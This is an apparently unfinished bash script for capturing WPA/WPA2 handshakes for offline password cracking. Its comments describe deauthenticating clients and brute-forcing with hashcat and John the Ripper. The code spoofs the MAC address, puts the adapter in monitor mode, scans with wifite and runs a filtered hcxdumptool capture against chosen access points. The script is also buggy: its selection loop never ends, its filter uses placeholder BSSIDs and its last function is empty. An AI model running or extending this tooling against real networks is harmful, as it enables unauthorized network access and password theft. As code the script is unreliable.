#!/bin/bash



#Basic Script mainly compiled in bash to AUTOMATE cracking WPA/WPA2 PSK hashes 
#This Script automates the process of collecting  Scanning efficiently via 


#(Works on 802.11 Networks on 2.4 GHZ networks, script must have access to Network Interface that has acess to packet injection to work properly..)



#####Utilization Use Case ###############

#How it works:

#We first use hcxdump tool to gather the specified WPA/WPA2 EAPOL Management Frame (Unecrypted 4th handshake in auth)
#This is done via deauth -> to then user reconnecting with the AP


#Then, we automate hashcat//JTR brute force and rule based attacks

#We use python munging along with policy enforcing on different password lists to generate complicated list
#We as well use a rule set to substitute certain password strings with other more complicated variants of a char ( e.g.  A - > @ )






##First shutdown systemd services that conflict



#sudo systemctl stop network.service
#sudo systemctl stop wpa_supplicant.service
#sudo systemctl stop NetworkManager


#Color classes

##COLOR DEF
# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' #####No Color (reset)
BOLD="\e[1m ... \e[0m"

#Get Deps 
getDepss() {

	echo -e "\n ${RED} CHECKING DEPENDENCIES NOW! ${NC} \n" 
	
	sleep 1
	#stdout and stderr get redirected to /dev/null
	#Checks for both hcxdumptool and pcapngtool
	if ! command -v hcxdumptool &> /dev/null || ! command -v  hcxpcapngtool &> /dev/null; then
		sudo apt-get install hcxtools hcxpcapngtool hcxdumptool libcurl4-openssl-dev libssl-dev-zib1g libpcap-dev  

	else
		echo -e " \n ${BLUE} DEPS ALL PROPERLY INSTALLED ${NC} \n "
	fi
}


#Generate pcap
getPcap() {
	getDepss
	echo -e "-------------------------------------------------------"
	##Cut out only wlan0 / wlan1-3 type interface profiles to show to user
	##grep -E --- PATTERNS are extended regular expressions
	#cut with delim '' with feild 2 cuts out the correct wording, sed cuts out semicolon w/ regex
	ip addr | grep -E "wlan[0-9]" | cut -d ' ' -f2 | sed 's/://g' && sleep 2
	echo -e " ------------------------------------------------------ ${NC} " 
	read -p "Select Wireless-Interface to Capture Traffic Here... " int

	#Spoof wlan first before capture
	sudo ip link set dev "$int" down && sudo macchanger -b -r "$int"
	sudo ip link set dev "$int" up


	#Activate monitor mode
	sudo airmon-ng start "$int"
	ip addr
	echo -e "\n To turn your wireless interface off of monitor mode... use command sudo airmon-ng <wireless-int> stop \n "


	while true; do
		#Get all req info for targeting specific AP
		echo -e "\n ${BOLD} ${PURPLE} SCANNING FOR APS NEARBY WITH MONITOR MODE.... ${NC} \n "
		echo -e "\n Will Last 60 Seconds.. \n "
		timeout 60s sudo wifite -i "wlan0" --nodeauths --random-mac --wpa --daemon >> APS.txt
		sleep 3

		cat APS.txt
		#In future, maybe use python or different lang to parse file easier
		#pass=(pwd)
		#aps=""$pass"APS.txt"

		#while IFS= read -r line; do

		read -p "Correct AP's Show up? (y/n): " correcting

		if [ "$correcting" == "y"  ]; then
			read -p "Enter Correct AP SSID (Name of Acess Point / WIFI Network)  \n " apName
			

		else


			continue



		fi 
		
	done

	


	##Attempt to target specific ssid and grab a pcap of the eapol frames, attempts for many keys for better sucess rate of cracking // getting actual pass hash data
	#hcxdumptool -i "$int" -w dumpfile.pcapng  ----attemptapmax=5 --rds=1 -F
	#hcxdumptool -o OUTPUTFILE.pcapng -i "$int"mon --enable_status=1 --filterlist_ap=apList.txt --filtermode=2 
	

	#"kernel space Berkeley Packet Filter"
	#uses BSSID list from wifite to then create a bpf file and target specific ap
	sudo hcxdumptool --bpfc="wlan addr3 BSSID1 or wlan addr3 BSSID2" > targett.bpf
	sleep 3
	#Now, we attack the specific APS with the bpf targ file with inp and output file
	##Enable majority of EAPOL frames  as well as radio freq capture
	sudo hcxdumptool --rds=1 -F   --enable_status=1551 --bpf=targett.bpf -i wlan1mon -w outfile.pcapng
}

	


getPcap


##Translate the captured pcap file
TransPcap() { 

}





